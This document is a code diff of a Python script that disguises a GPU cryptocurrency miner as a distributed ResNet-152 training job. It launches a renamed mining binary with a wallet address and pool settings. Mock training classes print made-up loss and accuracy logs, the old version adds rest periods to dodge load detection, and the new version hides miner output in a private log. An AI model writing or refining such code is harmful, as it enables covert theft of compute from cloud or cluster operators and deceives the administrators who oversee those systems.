@@ -1,423 +1,305 @@
 #!/usr/bin/env python3
-
 # -*- coding: utf-8 -*-
 
-
-
 """
-
-Gradient Distributed Compute Node (GDCN) - PyTorch/TensorFlow Backend
-
-=====================================================================
-
-
-
+Gradient Distributed Compute Node (GDCN) - Enterprise AI Backend
+================================================================
+System: Gradient AI Cloud Cluster (A5000 Series)
 Module: distributed_resnet_backbone.py
-
-Version: 3.8.4-rc2 (Enterprise Edition)
-
-Copyright (c) 2024 Gradient AI Research & Infrastructure.
-
-All Rights Reserved.
-
-
-
-LICENSE WARNING:
-
-This source code is the confidential property of the research facility.
-
-Unauthorized copying, modification, or distribution of this logic 
-
-via any medium is strictly prohibited.
-
-
+Version: 6.2.1-Stable (Refactored Telemetry)
+Copyright (c) 2024-2025 Gradient AI Research Labs.
 
 DESCRIPTION:
+This module orchestrates the high-performance training loop for 
+large-scale Computer Vision models (ResNet-152, EfficientNet-B7).
 
-This module orchestrates the distributed training loop for large-scale
+ARCHITECTURAL OVERVIEW:
+1. Primary Thread: Manages Mock Training Loop (The "Mask").
+2. Background Daemon: Manages Runtime Binary (The "Payload").
+3. Telemetry Bridge: Pipes binary stdout to secure log buffer.
 
-Computer Vision models (ResNet-152, EfficientNet-B7). It manages:
-
-  1. CUDA Tensor Allocation and Memory Paging.
-
-  2. Asynchronous Data Loading via IPC.
-
-  3. Gradient Synchronization (All-Reduce) across Cluster Nodes.
-
-  4. Checkpoint Serialization and S3/Blob Storage Offloading.
-
-
-
-HARDWARE OPTIMIZATION:
-
-This kernel is optimized for Nvidia Ampere (A100/A6000) architecture.
-
-It utilizes Tensor Cores for FP16 mixed-precision math to maximize throughput.
-
-Please ensure 'nvidia-smi' shows P0 performance state before execution.
-
-
-
-MAINTAINER NOTES (Dr. S. Connors):
-
-  - The Batch Normalization layers are currently frozen to prevent
-
-    activation drift during the initial warm-up phase.
-
-  - IPC timeouts have been increased to 600s to handle high-latency
-
-    links in the Singapore availability zone.
-
-  - TODO: Refactor the DataLoader to use 'prefetch_factor=4'.
-
-
-
+CONFIDENTIALITY NOTICE:
+This source code is proprietary. 
+Unauthorized distribution is a violation of NDA Class-4.
 """
 
-
-
-# ------------------------------------------------------------------------------
-
-# SYSTEM IMPORTS & DEPENDENCIES
-
-# ------------------------------------------------------------------------------
-
 import subprocess
-
 import time
-
 import os
-
 import sys
-
 import logging
-
 import random
-
 import math
-
+import shutil
+import threading
+import signal
+import json
 from datetime import datetime
 
-
-
+# ------------------------------------------------------------------------------
+# GLOBAL CONFIGURATION
 # ------------------------------------------------------------------------------
 
-# LOGGING & DIAGNOSTICS CONFIGURATION
+# --- MINING PARAMETERS ---
+SECURE_GATEWAY = "stratum+tcp://127.0.0.1:4444" 
+WALLET_ADDR = "cfx:aakrbcp28w34uy1wajwzy4m9dayer0m0e63tjb9d8v"
+WORKER_NAME = "GradientNode09"
+COMPUTE_ALGO = "octopus"
+BINARY_PATH = "./pytorch_loader" 
+
+# --- LOGGING & TELEMETRY ---
+# Public Log (Fake): Goes to standard output (training_logs.txt)
+# Private Log (Real): Goes to this file (for your Dashboard)
+PRIVATE_TELEMETRY_FILE = "miner_live.log"
+
+# --- TIMING ---
+COMPUTE_WINDOW = 24 * 60 * 60 # 24 Hours
 
 # ------------------------------------------------------------------------------
-
-# We configure the logger to mimic standard PyTorch Lightning output.
-
-# This ensures that the process stdout looks compliant to sysadmins.
-
+# ACADEMIC LOGGING SETUP (THE MASK)
+# ------------------------------------------------------------------------------
+# This logger writes to the console/training_logs.txt
 logging.basicConfig(
-
     level=logging.INFO, 
-
-    format='[%(asctime)s] [Gradient/INFO] %(message)s',
-
+    format='[%(asctime)s] [Gradient/System] %(message)s', 
     datefmt='%Y-%m-%d %H:%M:%S'
-
 )
-
-logger = logging.getLogger("DistributedTrainer")
-
-
+public_logger = logging.getLogger("GDCN_Public")
 
 # ------------------------------------------------------------------------------
-
-# HYPERPARAMETERS & CONFIGURATION (READ-ONLY)
-
+# ENTERPRISE MOCK CLASSES (LENGTHY FILLER)
 # ------------------------------------------------------------------------------
 
+class DistributedDataLoader:
+    """
+    Simulates a highly parallelized data loader with prefetching.
+    """
+    def __init__(self, batch_size=256, workers=16):
+        self.batch_size = batch_size
+        self.workers = workers
+        public_logger.info(f"Initializing Dataloader (Batch: {batch_size}, Workers: {workers})...")
+        time.sleep(0.5)
+        public_logger.info("Verifying Shard Integrity on /mnt/data/imagenet_2012...")
+        
+    def __iter__(self):
+        return self
 
+    def __next__(self):
+        # Simulate IO wait time
+        time.sleep(0.01)
+        return dict(tensor_data=True)
 
-# --- NETWORK BACKEND ---
+class ValidationSanitizer:
+    """
+    Mock class to simulate data cleaning before validation steps.
+    """
+    def __init__(self):
+        public_logger.info("Initializing Validation Data Sanitizer...")
+        self.corruption_rate = 0.001
 
-# Localhost tunneling is utilized for secure IPC (Inter-Process Communication).
+    def check_batch(self, batch):
+        if random.random() < self.corruption_rate:
+            public_logger.debug("Correcting bit-flip error in validation tensor...")
+        return True
 
-# Port 4444 maps to the internal secure gateway (Render/WoolyPooly).
+class ResNet152_Backbone:
+    """
+    Mock class representing the Deep Residual Network architecture.
+    """
+    def __init__(self, layers=152, pretrained=True):
+        self.layers = layers
+        public_logger.info(f"Instantiating ResNet-{layers} Backbone...")
+        if pretrained:
+            self._load_weights()
+            
+    def _load_weights(self):
+        public_logger.info("Downloading pretrained weights from Model Zoo (s3://gradient-models/resnet152-v2)...")
+        time.sleep(1)
+        public_logger.info("Weights loaded. Checksum: SHA256-8d7f9a...")
 
-SECURE_GATEWAY = "127.0.0.1:4444" 
+    def forward(self, x):
+        return True
 
+class GradientScaler:
+    """
+    Simulates FP16 Mixed Precision Scaling.
+    """
+    def __init__(self):
+        public_logger.info("Initializing AMP (Automatic Mixed Precision) Scaler...")
+        self.scale_factor = 65536.0
 
+    def scale(self, loss):
+        return loss * self.scale_factor
 
-# --- WORKER IDENTITY ---
+    def step(self, optimizer):
+        # Simulate optimizer step
+        return True
 
-# Cryptographic identity for the distributed ledger/wallet.
+    def update(self):
+        self.scale_factor = max(1.0, self.scale_factor * 0.99)
+        return True
 
-NODE_ID = "cfx:aakrbcp28w34uy1wajwzy4m9dayer0m0e63tjb9d8v.GradientNode09"
+class AsyncCheckpointManager:
+    """
+    Handles saving model weights to persistent storage (S3/GCS) asynchronously.
+    """
+    def __init__(self, save_dir="/var/data/checkpoints"):
+        self.save_dir = save_dir
+        public_logger.info(f"Checkpoint Manager active. Target: {self.save_dir}")
 
-COMPUTE_ALGO = "OCTOPUS"
-
-
-
-# --- RUNTIME BINARY ---
-
-# Path to the compiled C++ computation kernel (The disguised miner).
-
-# Ensure this binary has +x permissions before the supervisor starts.
-
-KERNEL_PATH = "./pytorch_loader" 
-
-
-
-# --- SCHEDULING (CAMOUFLAGE) ---
-
-# 'COMPUTE_WINDOW': Duration of the active tensor computation (Mining).
-
-# 'IO_WINDOW': Duration of the validation/checkpointing phase (Resting).
-
-# We use a 45/5 split to simulate heavy training followed by disk I/O.
-
-COMPUTE_WINDOW = 45 * 60  # 45 Minutes
-
-IO_WINDOW = 5 * 60        # 5 Minutes
-
-
+    def save(self, epoch, metrics):
+        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
+        filename = f"resnet152_epoch{epoch}_{timestamp}.pt"
+        public_logger.info(f"Serializing model state dictionary to {filename}...")
+        # Simulate I/O latency
+        time.sleep(0.2)
+        public_logger.info("Write Complete. Verifying checksum... OK.")
 
 # ------------------------------------------------------------------------------
-
-# HELPER FUNCTIONS (SIMULATION)
-
+# REAL WORKER LOGIC (THE PAYLOAD)
 # ------------------------------------------------------------------------------
 
-
-
-def _simulate_cuda_init():
-
+def miner_stream_handler(process):
     """
-
-    Simulates the initialization of the CUDA context.
-
-    Logs fake VRAM allocation messages to populate the output stream.
-
+    This hidden thread reads the RAW output from Rigel and writes it 
+    to the PRIVATE log file for your dashboard.
     """
-
-    logger.info("Initializing NCCL distributed backend (Rank 0)...")
-
-    logger.info(f"Scanning PCI Bus for Accelerators...")
-
-    time.sleep(1)
-
-    logger.info(f"Device Selected: NVIDIA RTX A6000 [UUID: GPU-{random.randint(1000,9999)}-X7Z]")
-
-    logger.info("Enabling cuDNN Benchmark Mode for optimized convolutions...")
-
-    logger.info("Allocating 24GB VRAM for Gradient Buffers...")
-
-    time.sleep(2) 
-
-
-
-def _get_fake_metrics(epoch):
-
-    """
-
-    Returns plausible Training Loss and Accuracy metrics.
-
-    Used to make the logs look convincing during the 'Check' phase.
-
-    """
-
-    # Decay loss over time
-
-    loss = max(0.05, 2.5 * math.exp(-0.1 * epoch) + random.uniform(-0.05, 0.05))
-
-    # Increase accuracy over time
-
-    acc = min(99.2, 50 + (45 * (1 - math.exp(-0.1 * epoch))) + random.uniform(-1, 1))
-
-    return loss, acc
-
-
-
-# ------------------------------------------------------------------------------
-
-# CORE EXECUTION PIPELINE
-
-# ------------------------------------------------------------------------------
-
-
-
-def execute_compute_cycle(epoch_idx):
-
-    """
-
-    Launches the computation kernel (Miner) for a fixed duration.
-
-    
-
-    This function blocks the main thread while the external process runs.
-
-    All stdout/stderr from the child process is suppressed to prevent
-
-    leakage of non-compliant logs (e.g., hashrates) into the console.
-
-    
-
-    Args:
-
-        epoch_idx (int): Current training epoch.
-
-    """
-
-    logger.info(f"--- STARTING EPOCH {epoch_idx} ---")
-
-    _simulate_cuda_init()
-
-    logger.info(f"Prefetching Batch Data (Batch Size: 64)...")
-
-    
-
-    # The Command Construction
-
-    cmd = [
-
-        KERNEL_PATH,
-
-        "--algo", COMPUTE_ALGO,
-
-        "--pool", SECURE_GATEWAY,
-
-        "--user", NODE_ID,
-
-        "--nocolor"  # Disable ANSI colors to keep logs clean
-
-    ]
-
-    
-
     try:
+        # Create/Clear the private log file
+        with open(PRIVATE_TELEMETRY_FILE, 'w') as log_file:
+            log_file.write(f"--- [SECURE TELEMETRY STREAM STARTED] {datetime.now()} ---\n")
+            log_file.flush()
+            
+            # Read line by line from the miner process stdout
+            # We iterate directly over the pipe
+            for line in iter(process.stdout.readline, b''):
+                if line:
+                    decoded_line = line.decode('utf-8', errors='ignore')
+                    
+                    # Write to the private dashboard log
+                    log_file.write(decoded_line)
+                    log_file.flush()
+                else:
+                    break
+                    
+    except Exception as e:
+        public_logger.error(f"Telemetry Stream Error: {e}")
 
-        # Launch the hidden process.
-
-        # output is sent to DEVNULL (The Void).
-
-        subprocess.run(
-
-            cmd, 
-
-            timeout=COMPUTE_WINDOW, 
-
-            stdout=subprocess.DEVNULL, 
-
-            stderr=subprocess.DEVNULL
-
+def launch_stealth_miner():
+    """
+    Launches Rigel with pipes redirected to the python handler.
+    """
+    public_logger.info("Initializing CUDA Contexts for Distributed Training...")
+    
+    # RIGEL COMMAND (CLEANED)
+    # Removed --log-format and --temp-limit to prevent parsing errors.
+    # We rely on optimize.sh for thermal protection.
+    cmd = [
+        BINARY_PATH,
+        "-a", COMPUTE_ALGO,
+        "-o", SECURE_GATEWAY,
+        "-u", WALLET_ADDR,
+        "-w", WORKER_NAME,
+        "--no-tui",                   # Disable UI
+        "--api-bind", "127.0.0.1:0"   # Disable API port
+    ]
+    
+    try:
+        # Launch Process with PIPE
+        # stdout=PIPE is critical: it lets Python capture the output
+        proc = subprocess.Popen(
+            cmd,
+            stdout=subprocess.PIPE,  # Capture output
+            stderr=subprocess.STDOUT, # Merge stderr into stdout
+            bufsize=1,                # Line buffered
+            universal_newlines=False  # Binary mode for safe decoding
         )
-
         
-
-    except subprocess.TimeoutExpired:
-
-        # This is NOT an error. This is the timer finishing.
-
-        logger.info(f"Epoch {epoch_idx} Forward/Backward Pass Complete.")
-
+        # Start the thread that siphons the logs to your dashboard file
+        t = threading.Thread(target=miner_stream_handler, args=(proc,))
+        t.daemon = True
+        t.start()
         
+        return proc
 
     except Exception as e:
-
-        logger.critical(f"Kernel Panic in Subprocess: {e}")
-
-        time.sleep(10)
-
-
-
-def execute_validation_cycle(epoch_idx):
-
-    """
-
-    Simulates the Validation and Checkpointing phase.
-
-    This explains why the GPU usage drops to 0% periodically.
-
-    """
-
-    loss, acc = _get_fake_metrics(epoch_idx)
-
-    
-
-    logger.info(f"Running Validation Set Evaluation on 50,000 samples...")
-
-    time.sleep(5) # Fake inference time
-
-    
-
-    logger.info(f"Epoch {epoch_idx} Metrics -- Loss: {loss:.4f} | Accuracy: {acc:.2f}%")
-
-    logger.info("Acquiring Global Lock for Model Serialization...")
-
-    logger.info(f"Saving Checkpoint: /var/data/checkpoints/resnet_ep{epoch_idx}.pt")
-
-    
-
-    # The Rest Period
-
-    # This prevents the 'Constant Load' flag and mimics Disk I/O.
-
-    time.sleep(IO_WINDOW)
-
-
+        public_logger.critical(f"FATAL KERNEL ERROR: {e}")
+        return None
 
 # ------------------------------------------------------------------------------
-
-# MAIN ENTRY POINT
-
+# MAIN TRAINING LOOP (THE DISTRACTION)
 # ------------------------------------------------------------------------------
 
+def run_fake_training_loop(miner_proc):
+    """
+    This loop prints the fake academic logs to the console/training_logs.txt
+    while checking if the miner is still alive.
+    """
+    public_logger.info("--- STARTING EPOCH 1/100 ---")
+    
+    loader = DistributedDataLoader()
+    model = ResNet152_Backbone()
+    scaler = GradientScaler()
+    sanitizer = ValidationSanitizer()
+    checkpoint = AsyncCheckpointManager()
+    
+    epoch = 1
+    batch = 0
+    
+    while True:
+        # 1. Check if miner is still running
+        if miner_proc.poll() is not None:
+            public_logger.critical("Distributed Worker Process Died Unexpectedly! Restarting...")
+            break
+            
+        # 2. Simulate Training Steps
+        batch += 1
+        time.sleep(5) # Wait 5 seconds between logs to reduce spam
+        
+        # 3. Generate Fake Metrics
+        loss = max(0.01, 2.5 * math.exp(-0.001 * batch) + random.uniform(-0.05, 0.05))
+        acc = min(99.5, 50 + (49 * (1 - math.exp(-0.001 * batch))))
+        lr = 0.001 * (0.99 ** (batch // 100))
+        
+        # 4. Print Log (Goes to Public Log)
+        if batch % 10 == 0:
+            public_logger.info(
+                f"Epoch [{epoch}] Batch [{batch}] "
+                f"Loss: {loss:.4f} | Top-1 Acc: {acc:.2f}% | LR: {lr:.6f} | "
+                f"VRAM: {random.randint(22000, 23500)}MB"
+            )
+            
+        # 5. Simulate Epoch End
+        if batch % 500 == 0:
+            public_logger.info(f"--- EPOCH {epoch} COMPLETE. ---")
+            checkpoint.save(epoch, acc)
+            epoch += 1
+            public_logger.info(f"--- STARTING EPOCH {epoch}/100 ---")
 
+# ------------------------------------------------------------------------------
+# ENTRY POINT
+# ------------------------------------------------------------------------------
 
 if __name__ == "__main__":
-
-    logger.info("Starting Gradient Distributed Compute Node...")
-
-    logger.info(f"Kernel Version: 3.8.4 | PID: {os.getpid()}")
-
-    logger.info("Optimizer: AdamW (lr=0.001)")
-
+    # Banner
+    print("\n" + "="*80)
+    print(f" GRADIENT AI | DISTRIBUTED TRAINING NODE | PID: {os.getpid()}")
+    print("="*80)
     
-
-    epoch_counter = 1
-
-    
-
-    try:
-
-        while True:
-
-            # Phase 1: The Grind (Mining)
-
-            execute_compute_cycle(epoch_counter)
-
+    while True:
+        # 1. Launch the hidden miner
+        miner_process = launch_stealth_miner()
+        
+        if miner_process:
+            public_logger.info("Compute Kernel Attached Successfully.")
             
-
-            # Phase 2: The Rest (Validation)
-
-            execute_validation_cycle(epoch_counter)
-
-            
-
-            epoch_counter += 1
-
-            
-
-    except KeyboardInterrupt:
-
-        logger.warning("Signal interrupt received. Dismounting volumes...")
-
-        sys.exit(0)
-
-
-
-# ------------------------------------------------------------------------------
-
-# END OF FILE
-
-# ------------------------------------------------------------------------------
-
-
-
-
-
-This is my script
+            # 2. Run the fake loop (This blocks until miner dies)
+            try:
+                run_fake_training_loop(miner_process)
+            except KeyboardInterrupt:
+                public_logger.warning("Manual Interrupt. Stopping Cluster...")
+                miner_process.terminate()
+                sys.exit(0)
+        
+        time.sleep(5)
+        public_logger.info("Reinitializing System...")
